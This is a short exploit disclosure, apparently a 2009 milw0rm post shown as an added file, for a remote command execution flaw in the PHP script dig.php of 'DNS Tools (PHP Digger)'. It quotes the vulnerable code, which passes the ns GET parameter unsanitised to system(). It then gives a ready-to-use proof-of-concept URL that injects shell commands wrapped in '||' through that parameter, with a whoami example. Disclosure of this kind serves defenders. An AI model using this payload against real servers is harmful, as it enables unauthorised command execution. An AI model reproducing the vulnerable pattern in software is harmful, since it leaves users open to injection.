@@ -1,0 +1,31 @@
+############################################################################################
+[+] DNS Tools (PHP Digger) Remote Command Execution
+[+] Discovered By SirGod
+[+] www.mortal-team.org
+[+] www.h4cky0u.org
+############################################################################################
+
+[+] Remote Command Execution
+
+ - Vulnerable code in dig.php
+
+------------------------------------------
+$ns  = $_GET['ns'];
+
+ system ("dig @$ns $host $query_type");
+------------------------------------------
+
+We can execute commands via "ns" variable.Just use || before and after
+the command.
+
+ PoC :
+
+  http://127.0.0.1/dig.php?ns=||COMMAND HERE||&host=mortal-team.net&query_type=NS&status=digging
+
+ Example :
+
+  http://127.0.0.1/dig.php?ns=||whoami||&host=mortal-team.net&query_type=NS&status=digging
+
+############################################################################################
+
+# milw0rm.com [2009-04-16]
